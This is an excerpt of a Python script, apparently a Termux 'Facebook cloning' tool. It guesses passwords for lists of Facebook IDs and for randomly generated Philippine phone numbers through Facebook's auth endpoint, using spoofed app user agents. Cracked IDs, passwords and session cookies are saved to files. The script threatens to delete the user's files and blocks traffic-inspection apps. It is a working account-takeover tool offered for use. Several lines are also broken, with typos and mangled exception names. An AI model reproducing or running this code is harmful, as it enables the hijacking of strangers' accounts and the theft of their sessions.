...
from concurrent.futures import ThreadPoolExecutor as ARTPOGI
from string import *
...
import os,sys,time,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from time import sleep
from time import sleep as waktu
import requests,bs4,json,os,sys,random,time,re,string
...
try:
        ...
        if f'com.h{t}pc{a}y.pro' in fileee:
                print(Panel('[bold red]FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS'))
...
def clr():
    try:
        ...
        if 'Android' in data:
            print(Panel('[bold red][!] ALL YOUR FILES WILL REMOVE IF YOU TRY AGAIN! '));exit()
        else:exit()
    except:exit()
...
def looood(BRYX):
    for i in track(range(60),description=BRYX):
        time.sleep(0.02)

icolor = random.choice(["\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m"])
color = random.choice(["\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m"])
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ SECURITY-CODE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           pass
      else:
           system('clear');print(Panel('SYSTEM MODIFICATION NOT ALLOWED SINCE USING ABHISHEK-F'));exit()
...
myweb2 = requests.get("https://bryxxxpogi.blogspot.com/2025/01/ABHISHEK.html").text
def apv():
    try:
        clear()
        x = requests.get("https://bryxxxpogi.blogspot.com/2025/01/ABHISHEK.html").text
        if str("upppdate") in update:
            ...
            print(Panel("[bold green]YOUR KEY IS APPROVED"))
            time.sleep(3)
        else:	
            clear();print(Panel(f"[bold cyan]USERNAME : {username}\nTOKEN    : {kex}\nYOUR SUBSCRIPTION DATE EXPIRED\nCLONING DATE : {date}\nCONTACT DEVELOPER TO GET SUBSCRIPTION"))
            input(f"PRESS ENTER TO SEND KEY TOOL DEVELOPER")
            os.system(f"termux-open-url https://wa.me/+639610075203?text={kex}")  	
            apv()
    except requests.exceptions.ConnectionABHISHEK:
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE UA ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def keeping():
    pekpek = ["Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 12; V2134 Build/SP1A.210812.003)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36","Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Redmi 7A Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36"]
    return random.choice(pekpek)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE UA ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
...
def UA():
    ...
    e = ";[FBAN/FB4A;FBAV/315.0.0.47.113;FBPN/com.facebook.katana;FBLC/en_US;FBBV/285966838;FBCR/Android;FBMF/Genymotion;FBBD/Android;FBDV/Xiaomi Redmi Note 7;FBSV/9;FBCA/x86:null;FBDM/{density=2.625,width=1080,height=2214};FB_FW/1;FBRV/287051585;]"+"[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'"
    f = ";[FBAN/FB4A;FBAV/152.0.0.30.117;FBBV/36747804;FBDM/{density=2.5,width=720,height=1280};FBLC/en_GB;FBCR/Salaam Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5100;FBSV/10.2.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Vi India;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'"
    ua = a+b+c+d+e+f
    return ua
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE UA ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def fire():
    ...
    height = random.cphoice(["720", "1080", "1280", "1440", "1920"])
    ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi-v7a;]"
    return ua
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD UA ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
...
def check_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Added to","Added to"),D))
...
$$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |  $$\   $$ |$$ |  $$ |$$ |      $$ |\$$\        $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |  $$ |\$$$ |$$ |  $$ |$$ |  $$ |
$$ |  $$ |$$$$$$$  |$$ |  $$ |$$$$$$\ \$$$$$$  |$$ |  $$ |$$$$$$$$\ $$ | \$$\       $$$$$$$  |$$ |  $$ |$$ |  $$ |$$$$$$\ $$ | \$$ |$$$$$$$  |$$ |  $$ |
\__|  \__|\_______/ \__|  \__|\______| \______/ \__|  \__|\________|\__|  \__|      \_______/ \__|  \__|\__|  \__|\______|\__|  \__|\_______/ \__|  \__|
...
def bypass():
    ...
    try:
        ...
        remote_keywords = ["https://bryxxxpogi.blogspot.com/2025/01/ABHISHEK.html", "ABHISHEK"]
        for file_path in file_paths:
            with open(file_path, 'r') as file:
                content = file.read()
                for keyword in suspicious_keywords:
                    if keyword in content:
                        print(Panel("[bold red]SUSPICIOUS ACTIVITY DETECTED!"))
                        print(Panel("[bold red]EXITING AND CLEARING FILES...[bold red]"))
                        exit()
                for remote in remote_keywords:
                    if remote in content:
                        print(Panel("[bold red]ATTEMPT TO BYPASS DETECTED! EXITING..."))
                        exit()
        sub()        
    except Exception as e:
        print(Panel(f"[bold red]AN ABHISHEK OCCURRED: {e}"))
        exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def menu():
        try:
                        ...
                        clear()
                        print(Panel(f'{color()}USERNAME : {username}\nTIME     : {time.strftime("%H:%M")+" "+ tag}\nDATE     : {date}',border_style=f"{border_color()}"))
                        print(Panel("[bold yellow][[bold cyan]1[bold yellow]][bold green] FILE CLONING\n[bold yellow][[bold cyan]2[bold yellow]][bold green] RANDOM CLONING\n[bold yellow][[bold cyan]3[bold yellow]][bold green] OLD CLONING\n[bold yellow][[bold cyan]4[bold yellow]][bold green] GMAIL CLONING\n[bold yellow][[bold cyan]5[bold yellow]][bold green] FACEBOOK FOLLOW PLEASE\n[bold yellow][[bold cyan]0[bold yellow]][bold red] EXIT",border_style=f"{border_color()}"))
                        bryyy=input(f'\033[1;36mChoose Number: \033[1;33m')
                        if bryyy in ['1','01']:
                                clear();print(Panel(f'EXAMPLE : /sdcard/File.txt  etc...'))
                                file = input(f'PUT FILE PATH : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundABHISHEK:
                                        print(Panel(f'FILE LOCATION NOT FOUND'))
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(Panel("[bold yellow][[bold cyan]1[bold yellow]][bold green] METHOD 1",border_style=f"{border_color()}"))
                                mthd=input(f'\033[1;36mMethod Number: \033[1;33m')
                                clear()
                                plist = []
                                print(Panel("[bold yellow][[bold cyan]1[bold yellow]][bold green] AUTO PASSWORD\n[bold yellow][[bold cyan]2[bold yellow]][bold green] CHOICE PASSWORD",border_style=f"{border_color()}"))
                                ppp=input(f'\033[1;36mPassword Number: \033[1;33m')
                                if ppp in ['1','01']:
                                        ...
                                        try:
                                                ...
                                                ps_limit =1
                                        clear()
                                        print(Panel(f'EXAMPLE : firstlast/first@@/first123'))
                                        for i in range(ps_limit):
                                                plist.append(input(f'PASSWORD {i+1}: '))
                                clear()
                                cx=input('DO YOU WENT SHOW CP ACCOUNT? (y/n): ')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(Panel(f'TOTAL ACCOUNT ID : {total_ids}\nIF NO RESULT ON/OFF AIRPLAN MODE'))
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print(Panel(f'THE PROCESS HAS COMPLETED\nTOTAL OK : {len(oks)}/CP : {len(cps)}'))
                                ...
                                os.system('xdg-open https://www.facebook.com/bryxxpogi');menu()
                        elif bryyy in ['0','00']:
                                exit(f'EXIT DONE')
                        else:
                                exit(f'OPTION NOT FOUND IN MENU');menu()
        except ValueABHISHEK:
                exit()
        except requests.exceptions.ConnectionABHISHEK:
...
def api1(ids,names,passlist):
    ...
    animasi = random.choice(["\x1b[1;91mABHISHEK","\x1b[1;92mABHISHEK","\x1b[1;93mABHISHEK","\x1b[1;94mABHISHEK","\x1b[1;95mABHISHEK","\x1b[1;96mABHISHEK","\x1b[1;97mABHISHEK","\x1b[1;91mABHISHEK","\x1b[1;92mABHISHEK","\x1b[1;93mABHISHEK","\x1b[1;94mABHISHEK","\x1b[1;95mABHISHEK","\x1b[1;96mABHISHEK"])
    ...
    try:
        ...
        for pw in passlist:
            ...
            network = random.choice(['SMART','TNT','TM','GLOBE','SUN'])
            ...
            if "session_key" in po:
                ...
                cek_apk(coki)
                print(Panel(f" [🔶ABHISHEK🔷]\n UID ⟩ {ids} \n PAS ⟩ {pas}\n COOKIE ⟩ {coki}",title=f"[green1][ABHISHEK-OK]",width=100,padding=(0,0),style='bold green'))
                cek_apk(coki)
                open('/sdcard/ABHISHEK-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['ABHISHEK']['message']:
                print(Panel(f" [🔶ABHISHEK🔷]\n UID ⟩ {ids} \n PAS ⟩ {pas}",title=f"[red1][ABHISHEK-CP]",width=100,padding=(0,0),style='bold red'))
                open('/sdcard/ABHISHEK-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def ph():
    user=[]
    clear()
    print(Panel(f"[bold green]SIM CODE : +63923,+63927,+63928,+63922,+63924"))
    code = input(f"Code Number : ")
    clear()
    print(Panel(f"[bold green]EXAMPLE : 10000,20000,30000,99999"))
    limit = int(input(f"Limit Number : "))
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=8)))
    with tred(max_workers=30) as crack_submit:
        clear();tl = str(len(user))      
        print(Panel(f"SIM CODE : {code}\nLIMIT    : {tl}\nIF NO RESULT ON/OFF AIRPLANE MODE"))
        for psx in user:
            ids = code+psx
            ...
            crack_submit.submit(rndm,ids,passlist)
    print(Panel(f'THE PROCESS HAS COMPLETED\nTOTAL OK : {len(oks)}/CP : {len(cps)}'));exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RANDOM METHOD ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = httpx.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(Panel(f" [🔶ABHISHEK🔷]\n UID ⟩ {str(uid)} \n PAS ⟩ {pas}\n COOKIE ⟩ {coki}",title=f"[green1][ABHISHEK-OK]",width=100,padding=(0,0),style='bold green'))
                                        open('/sdcard/ABHISHEK-RNDM-COOKIE.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/ABHISHEK-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        check_apk(session,coki)
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['ABHISHEK']['message']:
                                try:
                                        uid = po['ABHISHEK']['ABHISHEK_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print(Panel(f" [🔶ABHISHEK🔷]\n UID ⟩ {str(uid)} \n PAS ⟩ {pas}",title=f"[red1][ABHISHEK-CP]",width=100,padding=(0,0),style='bold red'))
                                        open('/sdcard/ABHISHEK-RND-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(uid))
                                        break
                        else:continue
                loop+=1
